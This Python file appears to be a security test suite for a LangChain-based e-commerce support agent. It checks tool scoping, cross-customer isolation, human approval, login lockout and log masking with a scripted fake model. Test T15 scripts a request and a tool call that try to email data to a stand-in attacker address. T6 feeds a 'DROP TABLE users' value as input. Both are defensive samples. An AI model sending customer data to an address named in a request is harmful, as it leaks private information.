"""Security tests for the ShopDesk agent. No OpenAI key or Gmail needed.

Run: uv run python tests/test_agent_security.py

The real agent is built with get_agent() (real tools, HITL + logging middleware, dynamic prompt,
SQLite checkpointer, resume_with_decision). Only the chat model and Gmail are replaced:
- agent.ChatOpenAI -> a scripted fake model that returns pre-written AIMessages / tool calls
- agent.load_gmail_tools -> one fake send_email tool
The tests write to ecommerce.db; db_init runs before and after, so the demo data ends up clean.
"""

import os
import shutil
import sqlite3
import sys
import tempfile
import traceback
from pathlib import Path
from types import SimpleNamespace
from uuid import uuid4

ROOT = Path(__file__).resolve().parents[1]
TMP = Path(tempfile.mkdtemp(prefix="shopdesk_test_"))

# Must be set before langchain_bot modules call load_dotenv() (it never overrides existing variables)
os.environ["CHECKPOINTS_DB_PATH"] = str(TMP / "checkpoints.sqlite")
os.environ["OPENAI_API_KEY"] = "sk-test-dummy-not-a-real-key"

from langchain_core.embeddings import FakeEmbeddings  # noqa: E402
from langchain_core.language_models.chat_models import BaseChatModel  # noqa: E402
from langchain_core.messages import AIMessage  # noqa: E402
from langchain_core.outputs import ChatGeneration, ChatResult  # noqa: E402
from langchain_core.tools import tool  # noqa: E402

from datetime import datetime, timedelta  # noqa: E402

from langchain_bot import agent as agent_mod  # noqa: E402
from langchain_bot import auth, customer_tools, db_init, middleware, rag_tool  # noqa: E402
from langchain_bot.context import SessionContext  # noqa: E402
from langchain_bot.hitl_utils import AlreadyDecidedError, decide_pending_action, handle_interrupt  # noqa: E402

PRIYA = "priya.sharma@example.com"
RAHUL = "rahul.verma@example.com"
ADMIN = "admin@example.com"
DB = db_init.DB_PATH


# ---------------------------------------------------------------------------
# Fakes
# ---------------------------------------------------------------------------

class ScriptedChatModel(BaseChatModel):
    """Returns the next pre-scripted AIMessage on every call."""

    script: list = []

    @property
    def _llm_type(self):
        return "scripted"

    def bind_tools(self, tools, **kwargs):
        return self

    def _generate(self, messages, stop=None, run_manager=None, **kwargs):
        message = self.script.pop(0) if self.script else AIMessage(content="(no more scripted replies)")
        return ChatResult(generations=[ChatGeneration(message=message)])


FAKE_MODEL = ScriptedChatModel()


SENT_EMAILS = []  # every call the fake Gmail MCP send_email receives


@tool("send_email")
def fake_mcp_send_email(to: list[str], subject: str, body: str, cc: list[str] | None = None) -> str:
    """Fake Gmail MCP send_email (the real one also takes cc/bcc)."""
    SENT_EMAILS.append({"to": to, "cc": cc, "subject": subject, "body": body})
    return f"Email sent to {to}"


@tool
def delete_email(message_id: str) -> str:
    """Fake Gmail MCP delete_email."""
    return "deleted"


@tool
def search_emails(query: str) -> str:
    """Fake Gmail MCP search_emails."""
    return "[]"


@tool
def read_email(message_id: str) -> str:
    """Fake Gmail MCP read_email."""
    return ""


async def fake_load_gmail_tools():
    return [fake_mcp_send_email, delete_email, search_emails, read_email]


agent_mod.ChatOpenAI = lambda **kwargs: FAKE_MODEL
agent_mod.load_gmail_tools = fake_load_gmail_tools


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def db(sql, params=()):
    conn = sqlite3.connect(DB)
    try:
        rows = conn.execute(sql, params).fetchall()
        conn.commit()
        return rows
    finally:
        conn.close()


def days_ago(days):
    return (datetime.now() - timedelta(days=days)).strftime("%Y-%m-%dT%H:%M:%S")


def pending_id(thread):
    return db("SELECT id FROM pending_actions WHERE thread_id = ?", (thread,))[0][0]


def runtime(email=PRIYA):
    return SimpleNamespace(context=SessionContext(user_email=email, conversation_id="test"))


def call(name, **args):
    return AIMessage(content="", tool_calls=[{"name": name, "args": args, "id": f"call_{uuid4().hex[:8]}",
                                              "type": "tool_call"}])


def ask(text, script, email=PRIYA):
    """Run one customer turn against the real agent with a scripted model. Returns (thread_id, result)."""
    conversation_id = uuid4().hex[:8]
    FAKE_MODEL.script = list(script)
    result = agent_mod.get_agent().invoke(
        {"messages": [{"role": "user", "content": text}]},
        config=agent_mod.get_thread_config(email, conversation_id),
        context=SessionContext(user_email=email, conversation_id=conversation_id),
    )
    return f"{email}:{conversation_id}", result


def tool_outputs(result):
    return [m.content for m in result["messages"] if m.type == "tool"]


RESULTS = []


def check(test_id, description, condition, detail=""):
    RESULTS.append((test_id, description, bool(condition), detail))


def run(test_id, description, fn):
    try:
        fn()
    except Exception as error:
        traceback.print_exc()
        check(test_id, description, False, f"exception: {type(error).__name__}: {error}")


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

def t1():
    graph = agent_mod.get_agent()
    names = set(graph.nodes["tools"].bound.tools_by_name)
    banned = {"sql_db_query", "sql_db_schema", "sql_db_list_tables", "sql_db_query_checker"} & names
    expected = {"get_my_orders", "get_order_details", "get_my_returns", "get_my_tickets", "get_my_spend",
                "log_email", "cancel_order_action", "create_return_action", "search_policies", "send_email"}
    check("T1", "agent has no free-form SQL tools", not banned and expected <= names,
          f"tools: {sorted(names)}" + (f" | banned found: {banned}" if banned else ""))


def t2():
    out = customer_tools.get_order_details.func(order_id=1, runtime=runtime())
    ok = '"items"' in out and '"payments"' in out and "Voltcart PowerCube 20000" in out and '"PAID"' in out
    check("T2", "get_order_details: Priya's order 1 -> items + payments", ok, out.replace("\n", " ")[:90] + "...")


def t3():
    owner = db("SELECT u.email FROM orders o JOIN users u ON u.id = o.user_id WHERE o.id = 2")[0][0]
    out = customer_tools.get_order_details.func(order_id=2, runtime=runtime())
    check("T3", "get_order_details: order 2 (Rahul's) as Priya -> not found",
          owner != PRIYA and out == f"Order #2 was not found for {PRIYA}.", f"owner={owner} | {out}")


def t4():
    rt = runtime()
    outputs = [
        customer_tools.get_my_orders.func(runtime=rt),
        customer_tools.get_my_orders.func(runtime=rt, status="delivered", limit=2),
        *[customer_tools.get_order_details.func(order_id=i, runtime=rt) for i in range(1, 21)],
        customer_tools.get_my_returns.func(runtime=rt),
        customer_tools.get_my_tickets.func(runtime=rt),
        customer_tools.get_my_spend.func(runtime=rt),
    ]
    leaks = [o for o in outputs if "pbkdf2" in o.lower() or "password" in o.lower()]
    other_emails = [o for o in outputs if "rahul" in o.lower() or "ananya" in o.lower()]
    check("T4", "no customer tool output contains password hashes or other customers",
          not leaks and not other_emails, f"{len(outputs)} outputs checked")


def t5():
    conn = customer_tools._connect_read_only()
    try:
        conn.execute("UPDATE orders SET status = 'CANCELLED' WHERE id = 13")
        conn.commit()
        refused, detail = False, "UPDATE succeeded"
    except sqlite3.OperationalError as error:
        refused, detail = True, str(error)
    finally:
        conn.close()
    still = db("SELECT status FROM orders WHERE id = 13")[0][0]
    check("T5", "read-only connection refuses writes", refused and still == "PLACED", f"{detail} | order 13 {still}")


def t6():
    priya_id = db("SELECT id FROM users WHERE email = ?", (PRIYA,))[0][0]
    count = lambda: db("SELECT COUNT(*) FROM email_logs")[0][0]  # noqa: E731
    before = count()
    ok_msg = customer_tools.log_email.func(subject="Order #13 cancellation received", body_preview="x" * 150,
                                           email_type="cancel_request", runtime=runtime())
    after_ok = count()
    row = db("SELECT user_id, email, email_type, LENGTH(body_preview) FROM email_logs ORDER BY id DESC LIMIT 1")[0]
    bad_msg = customer_tools.log_email.func(subject="x", body_preview="y", email_type="DROP TABLE users",
                                            runtime=runtime())
    after_bad = count()
    ok = (after_ok == before + 1 and row == (priya_id, PRIYA, "CANCEL_REQUEST", 100)
          and bad_msg.startswith("Invalid email_type") and after_bad == after_ok)
    check("T6", "log_email: one row for Priya; invalid email_type rejected", ok,
          f"row={row} | invalid -> '{bad_msg[:40]}...'")


STATE = {}


def t7():
    thread, result = ask("Cancel order 13", [
        call("get_order_details", order_id=13),
        call("cancel_order_action", order_id=13),
    ])
    STATE["t7_thread"] = thread
    interrupted = bool(result.get("__interrupt__"))
    status = db("SELECT status FROM orders WHERE id = 13")[0][0]
    message = handle_interrupt(result, thread, PRIYA)
    pending = db("SELECT action_type, order_id, status FROM pending_actions WHERE thread_id = ?", (thread,))
    check("T7", "'Cancel order 13' -> HITL interrupt, still PLACED, pending_actions saved",
          interrupted and status == "PLACED" and pending == [("CANCEL_ORDER", 13, "PENDING")] and message,
          f"interrupt={interrupted} | order 13 {status} | pending={pending}")


def t8():
    FAKE_MODEL.script = [AIMessage(content="Your order 13 is cancelled.")]
    result = agent_mod.resume_with_decision(STATE["t7_thread"], "approve")
    order = db("SELECT status FROM orders WHERE id = 13")[0][0]
    payments = {r[0] for r in db("SELECT status FROM payments WHERE order_id = 13")}
    ticket = db("SELECT COUNT(*) FROM tickets WHERE subject = 'Cancellation of order #13'")[0][0]
    check("T8", "approve -> order 13 CANCELLED, payment REFUNDED, ticket created",
          order == "CANCELLED" and payments == {"REFUNDED"} and ticket == 1,
          f"order={order} payments={payments} tickets={ticket} | {tool_outputs(result)[-1][:50]}")


def t9():
    before = db("SELECT * FROM returns")
    thread, result = ask("Return the desk lamp from order 4, it flickers", [
        call("get_order_details", order_id=4),
        call("create_return_action", order_id=4, product_name="Voltcart LED Desk Lamp", reason="Flickers"),
    ])
    interrupted = bool(result.get("__interrupt__"))
    handle_interrupt(result, thread, PRIYA)
    FAKE_MODEL.script = [AIMessage(content="Your return was rejected.")]
    out = agent_mod.resume_with_decision(thread, "reject", message="Test rejection")
    after = db("SELECT * FROM returns")
    check("T9", "return on order 4, admin rejects -> no new returns row",
          interrupted and after == before and "REJECTED" in tool_outputs(out)[-1],
          f"returns {len(before)} -> {len(after)}")


def t10():
    owner = db("SELECT u.email FROM orders o JOIN users u ON u.id = o.user_id WHERE o.id = 14")[0][0]
    thread, result = ask("Cancel order 14", [call("cancel_order_action", order_id=14)])
    interrupted = bool(result.get("__interrupt__"))
    FAKE_MODEL.script = [AIMessage(content="That order is not on your account.")]
    out = agent_mod.resume_with_decision(thread, "approve")
    status = db("SELECT status FROM orders WHERE id = 14")[0][0]
    payment = db("SELECT status FROM payments WHERE order_id = 14")[0][0]
    tool_result = tool_outputs(out)[-1]
    check("T10", "Priya cancels Rahul's order 14, admin approves -> still PLACED",
          owner != PRIYA and interrupted and status == "PLACED" and payment == "PAID" and "not found" in tool_result,
          f"owner={owner} | order 14 {status}/{payment} | {tool_result}")


def t11():
    """Bug 2: the same item cannot be returned (and refunded) twice."""
    outputs = []
    for _ in range(2):
        thread, result = ask("Return the wireless charging pad from order 4", [
            call("create_return_action", order_id=4, product_name="Voltcart Wireless Charging Pad", reason="Not needed"),
        ])
        FAKE_MODEL.script = [AIMessage(content="ok")]
        outputs.append(tool_outputs(agent_mod.resume_with_decision(thread, "approve"))[-1])
    rows = db("""SELECT COUNT(*) FROM returns r JOIN order_items oi ON oi.id = r.order_item_id
                 JOIN products p ON p.id = oi.product_id WHERE r.order_id = 4 AND p.name = 'Voltcart Wireless Charging Pad'""")[0][0]
    check("T11", "same item returned twice -> 2nd refused, one refund only",
          "APPROVED" in outputs[0] and "already has return" in outputs[1] and rows == 1,
          f"returns for item: {rows} | 2nd: {outputs[1][:60]}")


def t12():
    """Bug 3: the agent still builds when the Gmail MCP server cannot start."""
    async def broken_gmail():
        raise RuntimeError("OAuth keys file not found")

    agent_mod.load_gmail_tools = broken_gmail
    try:
        graph = agent_mod.create_support_agent()
        names = set(graph.nodes["tools"].bound.tools_by_name)
        email_flag = agent_mod.EMAIL_AVAILABLE
    finally:
        agent_mod.load_gmail_tools = fake_load_gmail_tools
        agent_mod.EMAIL_AVAILABLE = True
    check("T12", "Gmail unavailable -> agent still builds, no send_email, prompt flag off",
          "send_email" not in names and "get_order_details" in names and email_flag is False,
          f"EMAIL_AVAILABLE={email_flag} | {len(names)} tools")


def _stop_chroma():
    try:
        import gc

        from chromadb.api.shared_system_client import SharedSystemClient

        for system in list(SharedSystemClient._identifier_to_system.values()):
            system.stop()
        SharedSystemClient.clear_system_cache()
        gc.collect()
    except Exception as error:  # cleanup only; never fail the test run here
        print(f"(could not stop Chroma cleanly: {error})")


def t13():
    """Bug 1: an empty chroma_db/ left by a failed build is rebuilt, not reused."""
    original_dir, original_embeddings = rag_tool.CHROMA_DIR, rag_tool.OpenAIEmbeddings
    rag_tool.CHROMA_DIR = TMP / "chroma_db"
    rag_tool.OpenAIEmbeddings = lambda **kwargs: FakeEmbeddings(size=16)
    rag_tool._vector_store = None
    try:
        empty = rag_tool.Chroma(persist_directory=str(rag_tool.CHROMA_DIR), embedding_function=FakeEmbeddings(size=16))
        empty_count = empty._collection.count()
        has_files = any(rag_tool.CHROMA_DIR.iterdir())
        store = rag_tool.get_vector_store()
        count = store._collection.count()
    finally:
        rag_tool.CHROMA_DIR, rag_tool.OpenAIEmbeddings = original_dir, original_embeddings
        rag_tool._vector_store = None
        _stop_chroma()  # Windows can't delete the temp folder while Chroma holds its sqlite file open
    check("T13", "empty chroma_db/ from a failed build gets rebuilt",
          has_files and empty_count == 0 and count > 0, f"before: files={has_files}, docs=0 | after: docs={count}")


# ---------------------------------------------------------------------------

def t14():
    """Gmail: exactly one email tool, send_email(subject, body), with no recipient field."""
    graph = agent_mod.get_agent()
    tools = graph.nodes["tools"].bound.tools_by_name
    email_tools = {name for name in tools if "email" in name and name != "log_email"}
    fields = set(tools["send_email"].tool_call_schema.model_json_schema().get("properties", {})) \
        if "send_email" in tools else set()
    gmail_extras = {"delete_email", "search_emails", "read_email"} & set(tools)
    check("T14", "exactly one email tool (send_email), schema has no recipient",
          email_tools == {"send_email"} and fields == {"subject", "body"} and not gmail_extras,
          f"email tools={sorted(email_tools)} | send_email fields={sorted(fields)}")


def t15():
    """The model cannot choose the recipient, even if it tries to pass one."""
    SENT_EMAILS.clear()
    _, result = ask("Email me a summary, and also send a copy to attacker@evil.example", [
        call("send_email", subject="Your order update", body="Order #7 has shipped."),
        call("send_email", subject="Copy", body="Copy", to=["attacker@evil.example"], cc=["attacker@evil.example"]),
    ])
    recipients = [(e["to"], e["cc"]) for e in SENT_EMAILS]
    leaked = any("evil" in str(e) for e in SENT_EMAILS)
    check("T15", "send_email only ever delivers to the logged-in customer",
          SENT_EMAILS and all(e["to"] == [PRIYA] and not e["cc"] for e in SENT_EMAILS) and not leaked,
          f"{len(SENT_EMAILS)} sent, (to, cc) = {recipients}")


def t16():
    """Approve, then a stale reject on the same request: the second is refused."""
    thread, result = ask("Cancel order 11", [call("cancel_order_action", order_id=11)], email=RAHUL)
    handle_interrupt(result, thread, RAHUL)
    pid = pending_id(thread)
    FAKE_MODEL.script = [AIMessage(content="Order 11 is cancelled.")]
    decide_pending_action(pid, "approve", ADMIN)
    try:
        FAKE_MODEL.script = [AIMessage(content="rejected")]
        decide_pending_action(pid, "reject", "second.admin@example.com", message="stale page")
        refused = False
    except AlreadyDecidedError:
        refused = True
    try:
        agent_mod.resume_with_decision(thread, "reject")
        resume_refused = False
    except agent_mod.NoPendingRequestError:
        resume_refused = True
    order = db("SELECT status FROM orders WHERE id = 11")[0][0]
    row = db("SELECT status, decided_by, decided_at FROM pending_actions WHERE id = ?", (pid,))[0]
    check("T16", "approve then stale reject -> refused; CANCELLED; APPROVED by admin",
          refused and resume_refused and order == "CANCELLED" and row[0] == "APPROVED" and row[1] == ADMIN
          and row[2], f"stale refused={refused} | resume w/o interrupt refused={resume_refused} | "
                      f"order 11 {order} | row={row}")


def t17():
    """If resuming fails, the claimed row goes back to PENDING."""
    now = days_ago(0)
    db("""INSERT INTO pending_actions (thread_id, user_email, action_type, order_id, status, created_at, updated_at)
          VALUES (?, ?, 'CANCEL_ORDER', 15, 'PENDING', ?, ?)""", (f"{PRIYA}:never-paused", PRIYA, now, now))
    pid = db("SELECT MAX(id) FROM pending_actions")[0][0]
    try:
        decide_pending_action(pid, "approve", ADMIN)
        raised = False
    except agent_mod.NoPendingRequestError:
        raised = True
    status = db("SELECT status, decided_by FROM pending_actions WHERE id = ?", (pid,))[0]
    check("T17", "resume fails -> row released back to PENDING, nothing decided",
          raised and status == ("PENDING", None), f"raised={raised} | row={status}")


def t18():
    """30-day return window from delivered_at; an approved return is REFUND_PENDING and audited."""
    product = "Voltcart Screen Guard Kit"  # order 1, Priya, DELIVERED

    def request_return():
        thread, result = ask(f"Return the {product} from order 1", [
            call("create_return_action", order_id=1, product_name=product, reason="Does not fit"),
        ])
        handle_interrupt(result, thread, PRIYA)
        FAKE_MODEL.script = [AIMessage(content="done")]
        return tool_outputs(decide_pending_action(pending_id(thread), "approve", ADMIN))[-1]

    db("UPDATE orders SET delivered_at = ? WHERE id = 1", (days_ago(40),))
    returns_before = db("SELECT COUNT(*) FROM returns")[0][0]
    old = request_return()
    returns_after_old = db("SELECT COUNT(*) FROM returns")[0][0]

    db("UPDATE orders SET delivered_at = ? WHERE id = 1", (days_ago(5),))
    recent = request_return()
    ret = db("""SELECT r.status, r.admin_id FROM returns r JOIN order_items oi ON oi.id = r.order_item_id
                JOIN products p ON p.id = oi.product_id WHERE r.order_id = 1 AND p.name = ?""", (product,))
    pay = db("SELECT status, amount FROM payments WHERE order_id = 1 AND transaction_reference LIKE 'REFUND-RETURN-%'")
    admin_id = db("SELECT id FROM users WHERE email = ?", (ADMIN,))[0][0]
    details = customer_tools.get_order_details.func(order_id=1, runtime=runtime())
    check("T18", "return >30 days after delivery refused; recent -> REFUND_PENDING + admin_id",
          "outside the return window" in old and "30 days from the date of delivery" in old
          and returns_after_old == returns_before and "APPROVED" in recent
          and ret == [("APPROVED", admin_id)] and pay == [("REFUND_PENDING", 349.0)] and '"delivered_at"' in details,
          f"old -> '{old[:55]}...' | recent return={ret} payment={pay}")


def t19():
    """Login lockout after 5 bad attempts; other accounts unaffected; unlocks after 15 minutes."""
    real_clock, start = auth._clock, auth._clock()
    email = "ananya.iyer@example.com"
    try:
        auth._clock = lambda: start
        bad = [auth.authenticate_user(email, f"wrong{i}", "customer") for i in range(5)]
        locked_right_pw = auth.authenticate_user(email, "Ananya@123", "customer")
        minutes = auth.lockout_minutes_left(email.upper() + " ")
        other_user = auth.authenticate_user(PRIYA, "Priya@123", "customer")
        auth._clock = lambda: start + 16 * 60
        after = auth.authenticate_user(email, "Ananya@123", "customer")
    finally:
        auth._clock = real_clock
        auth._failures.clear()
        auth._locked_until.clear()
    check("T19", "5 bad logins -> locked 15 min (even right password); unlocks later",
          all(b is None for b in bad) and locked_right_pw is None and minutes == 15
          and other_user is not None and after is not None,
          f"locked={locked_right_pw is None} minutes_left={minutes} | other user ok={other_user is not None} | "
          f"after 16 min ok={after is not None}")


def t20():
    """Emails are masked in log lines."""
    masked = middleware.mask_emails(f"user {PRIYA} wrote to rahul.verma@example.com")
    start = middleware.LOG_FILE.stat().st_size if middleware.LOG_FILE.exists() else 0
    middleware.logger.info(f"test line | {PRIYA} | TOOL get_my_orders")
    for handler in middleware.logger.handlers:
        handler.flush()
    with open(middleware.LOG_FILE, encoding="utf-8") as f:
        f.seek(start)
        new_text = f.read()
    rotating = any(type(h).__name__ == "RotatingFileHandler" and h.maxBytes == 5 * 1024 * 1024 and h.backupCount == 3
                   for h in middleware.logger.handlers)
    check("T20", "log lines mask emails; file handler rotates 5 MB x 3",
          masked == "user p***@example.com wrote to r***@example.com" and "p***@example.com" in new_text
          and PRIYA not in new_text and rotating, f"'{masked}' | rotating={rotating}")


# ---------------------------------------------------------------------------
# Demo dates are rebased to the build day (T21-T24 rebuild the database themselves)
# ---------------------------------------------------------------------------

def _init(no_shift=False):
    if no_shift:
        os.environ["SHOPDESK_NO_DATE_SHIFT"] = "1"
    try:
        db_init.init_database()
    finally:
        os.environ.pop("SHOPDESK_NO_DATE_SHIFT", None)


def _delivered_ages(now):
    rows = db("SELECT id, delivered_at FROM orders WHERE status = 'DELIVERED'")
    return {oid: (now - datetime.fromisoformat(at)).total_seconds() / 86400 for oid, at in rows}


def _all_dates():
    out = {}
    for table, columns in db_init.DEMO_DATE_COLUMNS.items():
        for column in columns:
            out[(table, column)] = db(f"SELECT id, {column} FROM {table} ORDER BY id")
    return out


def _sql_file_dates():
    """The dates exactly as written in ecommerce_setup.sql (built in memory, no shift)."""
    conn = sqlite3.connect(":memory:")
    conn.executescript(db_init.SQL_SEED_PATH.read_text(encoding="utf-8"))
    out = {}
    for table, columns in db_init.DEMO_DATE_COLUMNS.items():
        for column in columns:
            out[(table, column)] = conn.execute(f"SELECT id, {column} FROM {table} ORDER BY id").fetchall()
    conn.close()
    return out


def _chronology_ok():
    """order_date < delivered_at < requested_at (<= resolved_at) for every demo return."""
    rows = db("""SELECT o.order_date, o.delivered_at, r.requested_at, r.resolved_at
                 FROM returns r JOIN orders o ON o.id = r.order_id WHERE r.id IN (1, 2)""")
    return len(rows) == 2 and all(od < da < rq and (rs is None or rq <= rs) for od, da, rq, rs in rows)


def _hitl_return_order_4(product="Voltcart LED Desk Lamp"):
    thread, result = ask(f"Return the {product} from order 4", [
        call("create_return_action", order_id=4, product_name=product, reason="Stopped working"),
    ])
    handle_interrupt(result, thread, PRIYA)
    FAKE_MODEL.script = [AIMessage(content="done")]
    return tool_outputs(decide_pending_action(pending_id(thread), "approve", ADMIN))[-1]


def t21():
    """After db_init the demo is recent: newest delivery <= 7 days old, every delivery < 30 days."""
    _init()
    ages = _delivered_ages(datetime.now())
    newest, oldest = min(ages.values()), max(ages.values())
    check("T21", "db_init rebases dates: newest delivery <= 7 days, all < 30 days",
          0 <= newest <= 7 and oldest < 30 and len(ages) == 5,
          "delivered ages (days): " + ", ".join(f"#{k}={v:.1f}" for k, v in sorted(ages.items())))


def t22():
    """On a freshly built demo DB a return on DELIVERED order 4 works through the HITL path."""
    _init()
    out = _hitl_return_order_4()
    pay = db("SELECT status FROM payments WHERE order_id = 4 AND transaction_reference LIKE 'REFUND-RETURN-%'")
    check("T22", "fresh demo DB: return on DELIVERED order 4 (HITL approve) works",
          "APPROVED" in out and pay == [("REFUND_PENDING",)], out[:80])


def t23():
    """Time travel: build with fake today 2027-03-01; returns still work, event order unchanged."""
    from langchain_bot import action_tools

    fake_today = datetime(2027, 3, 1, 12, 0, 0)

    class FakeDateTime(datetime):
        @classmethod
        def now(cls, tz=None):
            return fake_today

    _init(no_shift=True)
    before = _all_dates()
    conn = sqlite3.connect(DB)
    try:
        offset = db_init.shift_demo_dates(conn, today=fake_today.date())
    finally:
        conn.close()
    after = _all_dates()

    def gap_ok(a, b):
        return all(
            (datetime.fromisoformat(y) - datetime.fromisoformat(x)).days == offset
            for (_, x), (_, y) in zip(a, b) if x is not None
        ) and [x is None for _, x in a] == [y is None for _, y in b]

    every_column_shifted = all(gap_ok(before[key], after[key]) for key in before)
    ages = _delivered_ages(fake_today)
    real_datetime = action_tools.datetime
    action_tools.datetime = FakeDateTime
    try:
        out = _hitl_return_order_4()
    finally:
        action_tools.datetime = real_datetime
    check("T23", "time travel to 2027-03-01: shifted 96 days, order kept, return works",
          offset == 96 and every_column_shifted and _chronology_ok()
          and max(ages.values()) < 30 and min(ages.values()) <= 7 and "APPROVED" in out,
          f"offset={offset} | all columns +{offset}d={every_column_shifted} | chronology={_chronology_ok()} | "
          f"oldest delivery {max(ages.values()):.1f}d | return: {out[:30]}")


def t24():
    """SHOPDESK_NO_DATE_SHIFT=1 keeps every date exactly as in the SQL file; shift is a no-op for past days."""
    _init(no_shift=True)
    same = _all_dates() == _sql_file_dates()
    conn = sqlite3.connect(DB)
    try:
        noop = db_init.shift_demo_dates(conn, today=datetime(2026, 11, 1).date())
    finally:
        conn.close()
    still_same = _all_dates() == _sql_file_dates()
    check("T24", "SHOPDESK_NO_DATE_SHIFT=1 -> dates exactly as in SQL; past 'today' -> no change",
          same and noop == 0 and still_same,
          f"identical to SQL file={same} | shift with today<reference returned {noop}, unchanged={still_same}")


def main():
    os.environ.pop("SHOPDESK_NO_DATE_SHIFT", None)
    db_init.init_database()  # with the date shift: the return tests rely on recent demo deliveries
    tests = [
        ("T1", t1), ("T2", t2), ("T3", t3), ("T4", t4), ("T5", t5), ("T6", t6), ("T7", t7),
        ("T8", t8), ("T9", t9), ("T10", t10), ("T11", t11), ("T12", t12), ("T13", t13),
        ("T14", t14), ("T15", t15), ("T16", t16), ("T17", t17), ("T18", t18), ("T19", t19), ("T20", t20),
        ("T21", t21), ("T22", t22), ("T23", t23), ("T24", t24),
    ]
    try:
        for test_id, fn in tests:
            run(test_id, fn.__name__, fn)
    finally:
        db_init.init_database()  # leave clean demo data behind
        if agent_mod._checkpointer is not None:
            agent_mod._checkpointer.conn.close()
        shutil.rmtree(TMP, ignore_errors=True)

    print("\n" + "=" * 110)
    print(f"{'ID':4} {'RESULT':6}  {'TEST':62} DETAIL")
    print("-" * 110)
    for test_id, description, passed, detail in RESULTS:
        print(f"{test_id:4} {'PASS' if passed else 'FAIL':6}  {description[:62]:62} {detail[:140]}")
    failed = [r for r in RESULTS if not r[2]]
    print("-" * 110)
    print(f"{len(RESULTS) - len(failed)}/{len(RESULTS)} passed. Demo database re-initialised.")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
